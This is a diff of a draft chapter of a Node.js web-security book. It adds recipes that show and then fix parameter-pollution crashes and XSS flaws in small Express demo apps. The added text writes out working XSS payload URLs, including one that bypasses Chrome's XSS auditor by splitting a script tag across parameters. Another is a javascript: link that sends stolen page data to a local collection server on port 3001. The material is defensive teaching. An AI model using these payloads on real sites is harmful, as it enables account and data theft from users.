@@ -2,19 +2,18 @@
 
 This chapter covers the following topics
 
-* Injection
-* Stress attacks
-* Passive attacks
-* Vulnerable configurations
-* Path traversal
-* Unicode exploits
-* Escape sequences
-* XSS, CSRF, DoS/DDoS
-* DOR programmer error
+* Dependency Auditing
 * Server hardening
-* Dependency auditing
+* Important HTTP headers
+* Avoiding server fingerprinting
+* Cross Site Scripting (XSS)
+* Code Injection
+* Input validation
+* Lesser known vulnerabilities
+* Cross Site Request Forgery (CSRF)
+* Cross Origin Resources (CORS)
 
-## Introduction
+## Introduction 
 
 It's far from controversial to assert that security is paramount.
 
@@ -448,12 +447,19 @@ it for Internet Explorer 8.
 > in this chapter.
 
 Setting the `X-XSS-Protection` header to `1; mode=block` instructs
-the browser to refuse to render when it detects a Reflected XSS attack
-(e.g. a non-persistent attack, such as crafting a URL with a query
-parameter the executes JavaScript). However this shouldn't be relied on
-as full XSS protection, since there are other types of XSS attacks and 
-the ability for a browser to detect a reflected XSS attack in the first
-place is non-trivial (and has been inneffective in the past).
+the Internet Explorer to refuse to render when it detects a 
+Reflected XSS attack (e.g. a non-persistent attack, such as crafting a 
+URL with a query parameter the executes JavaScript). In Chrome the
+`X-XSS-Protection` header is used to opt-out (by setting to `0`) 
+of Chromes XSS auditor, which will automatically attempt to filter out
+malicious URL pieces. 
+
+In either case the `XSS-Protection` header shouldn't be relied 
+on as complete protection from XSS attacks, since it deals only
+with Reflected XSS which is only one type.  
+Additionally, the ability for a browser to detect a reflected XSS attack 
+place is non-trivial (and can be worked around, see the 
+**Guarding Against Cross Site Scripting (XSS)** recipe).
 
 One other header that `helmet` sets by default is the
 `Strict-Transport-Security` which is only enabled for
@@ -721,39 +727,714 @@ Connection: keep-alive
 * TBD
 
 
-## Handling Parameter Poisoning
+## Managing Malicious Unexpected Input
 
-When it comes to handling parameters, in some
-frameworks there can be an unexpected type gotcha
-that opens us up to Denial of Service attacks (at the least). 
+Malicious input can often catch us by surprise. We tend to
+cater to the common cases of but can easily neglect more 
+esoteric vulnerabilities resulting from unexpected or forgotten behaviors.
 
-In this recipe, we'll demonstrate and then 
-tackle the issue of potential parameter poisoning. 
+In the main recipe we'll focus on the parameter pollution
+case, in the There's More section we'll cover other important
+but often unfamiliar areas such as JSON validation and user input
+driven Buffer creation.
+
+Parameter pollution is quite a subtle form of attack, 
+and if we're not aware of the default way our framework
+and code handles this form of input validation, we may 
+open ourselves to Denial of Service attacks, and in 
+some cases allow for XSS or CSRF attacks. 
+
+In this recipe we're going to protect a server from 
+HTTP Parameter pollution.
 
 ### Getting Ready
 
+We'll use Express in this recipe, however the particular way 
+Express handles this case represents the norm across frameworks,
+and indeed the behavior corresponds to Node core functionality. 
+
+So let's create a tiny Express app, that shouts back whatever
+message we give it.
+
+We'll create an `app` folder, initialize it as a package, install
+`express` and create an `index.js` file:
+
+```sh
+$ mkdir app
+$ cd app
+$ npm init -y
+$ npm install --save express
+$ touch index.js
+```
+
+Our `index.js` file should look like the following:
+
+```js
+const express = require('express')
+const app = express()
+
+app.get('/', (req, res) => {
+  pretendDbQuery(() => {
+    const yelling = (req.query.msg || '').toUpperCase()
+    res.send(yelling)
+  })
+})
+
+app.listen(3000)
+
+function pretendDbQuery (cb) {
+  setTimeout(cb, 0)
+}
+```
+
 ### How to do it
+
+Let's start the server we prepared in the **Getting Ready** section:
+
+```sh
+$ node index.js
+```
+
+Now let's check it's functionality:
+
+```sh
+$ curl http://localhost:3000/?msg=hello
+HELLO
+```
+
+Using just `node` we can make the same request with:
+
+```sh
+$ node -e "require('http').get('http://localhost:3000/?msg=hello', 
+(res) => res.pipe(process.stdout))"
+HELLO
+```
+
+Seems to be working just fine. 
+
+But what if we do this:
+
+```sh
+$ curl -g http://localhost:3000/?msg[]=hello
+curl: (52) Empty reply from server
+```
+
+> #### `curl -g` ![](.../info.png)
+> The `-g` flag when passed to curl turns of a globbing option,
+> which allows us to use the square brackets in a URL
+
+Or if `curl` is available, we can do it with `node` like so:
+
+```sh
+$ require('http').get('http://localhost:3000/?msg[]=hello')
+events.js:160
+      throw er; // Unhandled 'error' event
+      ^
+
+Error: socket hang up
+    at createHangUpError (_http_client.js:253:15)
+    at Socket.socketOnEnd (_http_client.js:345:23)
+    at emitNone (events.js:91:20)
+    at Socket.emit (events.js:185:7)
+    at endReadableNT (_stream_readable.js:974:12)
+    at _combinedTickCallback (internal/process/next_tick.js:80:11)
+    at process._tickCallback (internal/process/next_tick.js:104:9)
+```
+
+Seems like our server has crashed. 
+
+Seems like that's a Denial of Service attack vector.
+
+What's the error message?
+
+```
+/app/index.js:8
+    const yelling = (req.query.msg || '').toUpperCase()
+                                          ^
+
+TypeError: req.query.msg.toUpperCase is not a function
+    at Timeout.pretendDbQuery [as _onTimeout] (/app/index.js:8:35)
+    at ontimeout (timers.js:380:14)
+    at tryOnTimeout (timers.js:244:5)
+    at Timer.listOnTimeout (timers.js:214:5)
+```
+
+The `toUpperCase` method exists on the `String.prototype`, 
+that is, every string has the `toUpperCase` method. 
+
+If `req.query.msg.toUpperCase is not a function` then 
+`req.query.msg` isn't a string. 
+
+> #### What about POST requests 
+> If the request was a POST request, our server would have the same
+> problem because the body of a application/x-www-form-urlencoded
+> POST request (the default for HTML forms) is also a query string.
+> The only difference would be, instead of crafting a URL an attacker
+> would have to trick a user into interacting with something that
+> initiated a POST request (say by clicking a button to "win an iPhone")
+
+Let's copy `index.js` to `index-fixed.js` and make the following change 
+to our route handler:
+
+```js
+app.get('/', (req, res) => {
+  pretendDbQuery(() => {
+    var msg = req.query.msg
+
+    if (Array.isArray(msg)) msg = msg.pop()
+
+    const yelling = (msg || '').toUpperCase()
+    res.send(yelling)
+  })
+})
+```
+
+Let's start our fixed server:
+
+```sh
+$ node index-fixed.js
+```
+
+Now if we try our malicious URL against the server:
+
+```sh
+$ curl -g http://localhost:3000/?msg[]=hello
+HELLO
+```
+
+Or with `node`:
+
+```sh
+$ node -e "require('http').get('http://localhost:3000/?msg[]=hello', 
+(res) => res.pipe(process.stdout))"
+HELLO
+```
 
 ### How it works
 
+
 ### There's more
+
+#### Dealing with JSON pollution
+
+#### Buffer safety
+
 
 ### See also
 
 * TBD
 
+
+
+
 ## Guarding Against Cross Site Scripting (XSS)
 
+Cross site scripting attacks are one of the most prevalent 
+and serious attacks today. XSS exploits can endanger users 
+and reputations in profound ways, but vulnerabilities occur
+easily especially when we don't practice an awareness of this
+particular area. 
 
-
+In this recipe, we're going to discover an XSS vulnerability
+and solve it.
 
 ### Getting Ready
 
+Let's create a folder called `app`, initialize it as a package,
+install `express` and create an `index.js` file
+
+```sh
+$ mkdir app
+$ cd app
+$ npm init -y
+$ npm install --save express
+$ touch index.js
+```
+
+Our `index.js` file should look like this:
+
+```js
+const express = require('express')
+const app = express()
+
+app.get('/', (req, res) => {
+  const {prev = '', handoverToken = '', lang = 'en'} = req.query
+  pretendDbQuery((err, status) => {
+    if (err) {
+      res.sendStatus(500)
+      return
+    }
+    res.send(`
+      <h1>Current Status</h1>
+      <div id=stat>  
+        ${status}
+      </div>
+      <br>
+      <a href="${prev}${handoverToken}/${lang}"> Back to Control HQ </a>
+    `)
+  })
+
+})
+
+function pretendDbQuery (cb) {
+  const status = 'ON FIRE!!! HELP!!!'
+  cb(null, status)
+}
+
+
+app.listen(3000)
+```
+
 ### How to do it
+
+Let's start the server we prepared in the *Getting Ready*
+section:
+
+```sh
+$ node index.js
+```
+
+Our server is emulating a scenario where one page is handing over
+some minimal state to another via GET parameters. 
+
+The parameters (`prev` `handoverToken` and `lang`) are quite innocuous
+and indeed valid in many scenarios.
+
+An example request to our server would look something like,
+http://localhost:3000/?prev=/home&handoverToken=JZ2AHE3GVVDBAI9XFPOAV2T9&lang=en.
+
+Let's try opening this route in our browser:
+
+![](images/xss-1.png)
+
+This page represents some kind of critical user information,
+perhaps the state of a financial portfolio, an urgent scheduling
+change, or perhaps an industrial or technical status relevant
+to an individuals job. In any case, it's important that this information
+is accurate and up to date, if an attacker with an agenda could cause
+this important page to show misinformation for their own purposes the
+consequences could be substantial. 
+
+Let's imagine an attacker sends an email to a target, asking them to 
+check the following URL status and make a decision based on that status,
+the URL the attacker creates is the following:
+
+http://localhost:3000/?prev=%22%3E%3Cscri&handoverToken=pt%3Estat.innerHTML=%22it%27s%20all%20good...%3Cbr%3Erelax%20:)%22%3C&lang=script%3E%3Ca%20href=%22
+
+If we visit the browser at this URL we should see something like:
+
+![](images/xss-2.png)
+
+To fix this vulnerability we need to escape the input 
+
+Let's copy the `app` folder to `fixed-app`:
+
+```sh
+$ cp -fr app fixed-app
+```
+
+Then in the `fixed-app` folder, we'll install the `he`
+module:
+
+```sh
+$ npm install --save he
+```
+
+Next we'll require `he` into `index.js`; the 
+top of `index.js` should look like so:
+
+```js
+const express = require('express')
+const he = require('he')
+const app = express()
+```
+
+Finally we'll encode all input, let's alter our route handler
+as follows: 
+
+```js
+app.get('/', (req, res) => {
+  const {prev = '', handoverToken = '', lang = 'en'} = req.query
+  pretendDbQuery((err, status) => {
+    if (err) {
+      res.sendStatus(500)
+      return
+    }
+    const href = he.encode(`${prev}${handoverToken}/${lang}`)
+    res.send(`
+      <h1>Current Status</h1>
+      <div id=stat>  
+        ${he.escape(status)}
+      </div>
+      <br>
+      <a href="${href}"> Back to Control HQ </a>
+    `)
+  })
+})
+```
+
+We extracted the url portion of our HTML into the `href` constant,
+and passed the entire concatenated string into the `he.encode`
+function. Notably, we also escaped data coming from our (pretent)
+database query - we pass the `status` argument through `he.escape`.   
+
+Now if we run our `fixed-app` server:
+
+```sh
+$ node index.js
+```
+
+And attempt to access the same URL (http://localhost:3000/?prev=%22%3E%3Cscri&handoverToken=pt%3Estat.innerHTML=%22it%27s%20all%20good...%3Cbr%3Erelax%20:)%22%3C&lang=script%3E%3Ca%20href=%22) 
+in the browser, we should see the intended status, as in the following image.
+
+![](images/xss-3.png)
+
+> #### We're not fully secure yet ![](../info.png)
+> Our app still has another XSS vulnerability.
+> We'll deal with this further in the **There's More** section
 
 ### How it works
 
+There are two mains types of XSS, reflected and persistent.
+Persistent XSS is where an attacker was able to implant a code
+exploit within a persistent layer of our architecture (for instance,
+a server side database, but also caching layers and browser persistant
+could come under the same banner). Reflected XSS is a reliant on a single
+interaction with a server, such that the content returned by the server
+contains the code exploit. 
+
+In our case, the main problem is a reflected XSS vulnerability.
+
+The way the `href` attributed of the anchor tag (`<a>`) is constructed
+from input parameters allows an attacker to create a URL that can 
+effectively break context (i.e. the context of being an HTML attribute),
+and inject code into the client. 
+
+Let's take the parameters in the malicious URL and break them down.
+First there's the `prev` parameter, which is set to `%22%3E%3Cscri`.
+For clarity, we can quickly decode the URI encoded elements like so:
+
+```sh
+$ $ node -p "decodeURI('%22%3E%3Cscri')"
+"><scri  
+```
+
+The anchor element in our original `app` looks like this:
+
+```html
+<a href="${prev}${handoverToken}/${lang}"> Back to Control HQ </a>
+```
+
+If we replace the `prev` interpolation in place we get:
+
+```html
+<a href=""><scri${handoverToken}/${lang}"> Back to Control HQ </a>
+```
+
+So we've been able to close the `href` attibute and the `<a>` tag
+and begin the `<script>` tag. 
+
+We can't just put the entire `<script>` tag in a single parameter,
+at least not in Chrome. Chrome has an "XSS auditor" which is enabled
+by default.
+```
+
+> #### XSS Auditor ![](../info.png)
+> For more on Chromes XSS auditor see the **Hardening Headers in Web Frameworks** 
+> recipe, in particular the portion about the `XSS-Protection` header 
+
+If we move the `pt>` characters from the `handoverToken` parameter into
+the `prev` parameter, in Chrome, and open Chrome Devtools we'll see 
+an error message as shown in the following image:
+
+![](xss-4.png)
+
+By spreading the `<script>` tag across two injected parameters, we 
+were able to bypass Chromes XSS auditor (at least the time of writing,
+if this no longer works in Chrome at the time of reading, 
+we may be able to run the exploit in another browser, such as Safari, IE, or Firefox).
+
+The `handoverToken` parameter is `pt%3Estat.innerHTML=%22it%27s%20all%20good...%3Cbr%3Erelax%20:)%22%3C`.
+
+Let's decode that:
+
+```sh
+$ node -p "decodeURI('pt%3Estat.innerHTML=%22it%27s%20all%20good...%3Cbr%3Erelax%20:)%22%3C')"
+pt>stat.innerHTML="it's all good...<br>relax :)"<
+```
+
+Let's replace the interpolated `handoverToken` in our HTML alongside
+the replace `prev` token:
+
+```html
+<a href=""><script>stat.innerHTML="it's all good...<br>relax :)"</${lang}"> Back to Control HQ </a>
+``` 
+
+Now we've been able to complete the `<script>` tag and insert
+some JavaScript which will run directly in the browser when the page loads.
+
+The injected code accesses the `<div>` element with an `id` attribute of`
+`stat` and sets the `innerHTML` to an alternative status. The HTML5 specification indicates that the value of an `id`
+field should become a global variable (see https://html.spec.whatwg.org/#named-access-on-the-window-object).
+Whilst we could use `document.getElementById` we use the shorthand version
+for our purposes (although as a development practice this a brittle approach).
+
+Finally, the `lang` token is `script%3E%3Ca%20href=%22`. 
+
+Let's decode it:
+
+```sh
+$ node -p "decodeURI('script%3E%3Ca%20href=%22')"
+script><a href="
+```
+
+Now let's insert that into the HTML:
+
+```html
+<a href=""><script>stat.innerHTML="it's all good...<br>relax :)"</script><a href=""> Back to Control HQ </a>
+```
+
+Notice how this attack utilized the forward slash (`/`) in the URL as 
+the forward slash for the closing `</script>` tag. After closing the
+script tag, the JavaScript will now run in the browser, but to avoid
+raising suspicion the attack also creates a new dummy anchor tag to
+prevent any broken HTML appearing in the page. 
+
+We pass the fully assembled contents of the `href` attribute through 
+the `he.encode` function. The `he.encode` function performs 
+HTML Attribute Encoding, whereas the `he.escape` function (used 
+on the `status` argument) performs HTML Entity encoding. 
+Since we're placing user input inside an HTML attribute, the safest
+way to escape the input is by encoding all non-alphanumeric characters
+as hex value HTML entities. For instance the double quote `"` becomes
+`&#x22;`, which prevents it from closing out the attribute.
+
+We also pass the `status` parameter which originates in from our
+`pretendDbQuery` call through the `he.escape` function. 
+The `he.escape` function converts HTML syntax into HTML (semantic) entities, 
+for instance the opening tag less than character (`<`) becomes `&lt;`. 
+
+All input that isn't generated by our Node process should be treated 
+as user input. We cannot guarantee whether other parts of the system have allowed
+uncleaned user input into the database, so to avoid persistent XSS 
+attacks we need to clean database input as well.
+
+We pass `status` through `he.escape` because it appears in a general 
+HTML context, whereas we pass `href` through `he.encode` because it 
+appears in an HTML attribute context.
+
 ### There's more
+
+Our server is still vulnerable, let's fix it. Also let's explore
+some other practices that help with general server security. 
+
+#### Preventing protocol-handler-based XSS
+
+Our server is still vulnerable to XSS injection.
+
+In this scenario, an attacker is going to steal the status
+(which represents privileged information).
+
+Let's use the following command to create a "malicious" 
+data collection server: 
+
+```sh
+$ node -e "require('http').createServer((req, res) => {
+  console.log(
+    req.connection.remoteAddress, 
+    Buffer(req.url.split('/attack/')[1], 'base64').toString().trim()
+  )
+}).listen(3001)"
+```
+
+We're using the `-e` flag (evaluate) to quickly spin up an HTTP 
+server that logs the user IP address, and stolen status. It's 
+expecting the status to be base64 encoded (this helps to avoid
+potential errors on the client side). 
+
+Now let's start the `fixed-app` server from the main recipe:
+
+```sh
+$ cd fixed-app
+$ node index.js
+``` 
+
+In the browser, we'll use the following URL to initiate the attack:
+
+http://localhost:3000/?prev=javascript:(new%20Image().src)=`http://localhost:3001/attack/${btoa(stat.innerHTML)}`,0/
+
+This won't change any visible rendering but it will cause the 
+"Back to Control HQ" link to point to `javascript:(new Image().src)=``http://localhost:3001/attack/${btoa(stat.innerHTML)}``,0/`.
+
+When the link is clicked, an HTML `<img>` element is created, 
+(via the JavaScript `Image` constructor), with the `src` attribute set to
+our attack server with the base64 encoded stolen status. We use the `btoa`
+global function to base64 encode, and the global DOM element ID behavior
+to again grab the inner html of the status `<div>`. The following `,0` 
+portion causes the return value of the entire expression to be 
+falsey, if the return value is not falsey the browser will render it
+(in this case the absence of the `,0` would result in the browser rendering
+the attack URL, which is a dead giveaway). The final forward slash `/`
+couples with the forward slash after the `prev` parameter to create a 
+double forward slash (`//`), which in JavaScript is comment. This causes
+the rest of the content in the `href` to be ignored.  
+
+If we click the link, our data collection server should show a message: 
+
+```
+::1 ON FIRE!!! HELP!!!
+```
+
+As shown in the following image:
+
+![](images/xss-5.png)
+
+`::1` is the IPv6 address for the localhost (the equivalent of `127.0.0.1`).
+
+The `javascript:` protocol handler allows for JavaScript execution 
+as a URI. This is of course, a terrible idea. However, custom protocol
+handlers are introduced into browsers all the time and may also have
+vulnerabilities. For instance the Steam gaming platform when installed
+introduces the `steam://` protocol into browsers, which could in turn be
+exploited to execute arbitrary Operating System commands on the host machine
+via a second buffer overflow vulnerability in Steams splash screen (see 
+http://revuln.com/files/ReVuln_Steam_Browser_Protocol_Insecurity.pdf).
+
+Our server is vulnerable because we allow user input to determine the
+beginning of a `href` attribute - the only safe way to avoid a protocol
+handler exploit is to never do that.  
+
+We can fix this by including an explicit route in the `href` attribute. 
+
+Let's copy `fixed-app` to `protocol-safe-app`:
+
+```sh
+$ cp -fr fixed-app protocol-safe-app
+```
+
+Now let's modify the `href` constant to:
+
+```js
+    const href = escapeHtml(`/${prev}${handoverToken}/${lang}`)
+```
+
+If we stop the `fixed-app` server and start the `protocol-safe-app`
+server:
+
+```sh
+$ cd protocol-safe-app
+$ node index.js
+```
+
+And attempt to use the same URL http://localhost:3000/?prev=javascript:(new%20Image().src)=`http://localhost:3001/attack/${btoa(stat.innerHTML)}`,0/,
+when we click the "Back to Control HQ" link, we should instead receive 
+a 404 message (in development the message will be something like "Cannot GET /javascript:(new%20Image().src)=%60http://localhost:3001/attack/$%7Bbtoa(stat.innerHTML)%7D%60,0//en").
+
+> #### CSRF 
+> This attack conceptually touches on CSRF, by using XSS to initiate  
+> an attack that uses the (hypothetical) access privilege 
+> of the user to execute commands on their behalf. We'll find out 
+> more about CSRF in the **Preventing Cross Site Request Forgery** recipe.
+
+#### Parameter Validation
+
+The browser address bar does not wrap a long URL, if the URL is longer
+than the address bar the remainder of the URL is hidden. 
+
+This can make it difficult, even for savvy users, to identify a malicious URL,
+especially when the site has a tendency to use long URLs in the first place.
+This is, even more of a problem on mobile devices. 
+
+In general, even for useability, it's good practice to keep URLs as 
+short as possible. Enforcing a short URL length 
+(that fits in a smallish desktop browser window), 
+to say, 140 characters is probably too brittle for most sites, but one
+thing we could do in our case is enforce expected parameter constraints.
+
+Let's copy the original `app` folder we prepared in the **Getting Ready**
+section to a folder called `param-constraints-app`:
+
+```sh
+$ cp -fr app param-constraints-app
+```
+
+In `index.js` we'll create a simply validation function:
+
+```js
+function validate ({prev, handoverToken, lang}, query) {
+  var valid = Object.keys(query).length <= 3
+  valid = valid && typeof lang === 'string' && lang.length === 2
+  valid = valid && typeof handoverToken === 'string' && handoverToken.length === 16
+  valid = valid && typeof prev === 'string' && prev.length < 10
+  return valid
+}
+```
+
+> ##### Object Validation ![](../tip.png)
+> For serious validation, check out the http://npm.im/joi module, 
+> it's primarily maintained by the HapiJS community but it can be
+> used with any web framework. 
+
+Now we'll insert validation near the top of our route handler:
+
+```js
+app.get('/', (req, res) => {
+  const {prev = '', handoverToken = '', lang = 'en'} = req.query
+
+  if (!validate({prev, handoverToken, lang}, req.query)) {
+    res.sendStatus(422)
+    return
+  }
+
+  pretendDbQuery((err, status) => {
+    if (err) {
+      res.sendStatus(500)
+      return
+    }
+    res.send(`
+      <h1>Current Status</h1>
+      <div id=stat>  
+        ${status}
+      </div>
+      <div>
+      <a href="${prev}${handoverToken}/${lang}"> Back to Control HQ </a>
+      </div>
+    `)
+  })
+
+})
+```
+
+Now if we try the malicious URL from the main recipe, 
+http://localhost:3000/?prev=%22%3E%3Cscri&handoverToken=pt%3Estat.innerHTML=%22it%27s%20all%20good...%3Cbr%3Erelax%20:)%22%3C&lang=script%3E%3Ca%20href=%22
+we'll get an "Unprocessable Entity" response. 
+
+Whilst strict parameter validation does make it far more difficult to craft 
+a malicious URL it is not as safe as escaping the HTML and avoiding 
+protocol handlers - for instance the following URL can still execute
+JavaScript when the link is clicked: 
+
+http://localhost:3000/?prev=javasc&handoverToken=ript:alert(%27hi%27)
+
+This is because the parameters still fit in the constraints. 
+
+A combination of escaping user input and external data, 
+avoiding user input from setting protocol handlers in URLs and
+enforcing parameter constraints is the safest approach.  
+
+#### Escaping in JavaScript contexts 
+
+We've explored both HTML and HTML attribute encoding, but user
+input may appear in other contexts too, such as in a piece of 
+of JavaScript code. While embedding user input in JavaScript 
+is highly recommended against if there ever is cause we
+should escape untrusted input in JavaScript with unicode escapes.
+
+We can use jsesc to do this https://github.com/mathiasbynens/jsesc.
+
+> ##### OWASP Output encodings ![](../info.png)
+> For a full list of encoding formats for various scenarios
+> see https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet#Output_Encoding_Rules_Summary
 
 ### See also
 
@@ -765,6 +1446,10 @@ The browser security model, where a session cookie
 is valid among separate browser tabs/windows, enables
 a vast array of nefarious attacks on users. 
 
+note: SameSite
+
+
+
 ### Getting Ready
 
 ### How to do it
@@ -777,14 +1462,5 @@ a vast array of nefarious attacks on users.
 
 * TBD
 
-## Avoiding Timing Attacks
 
-### Getting Ready
 
-### How to do it
-
-### How it works
-
-### There's more
-
-### See also
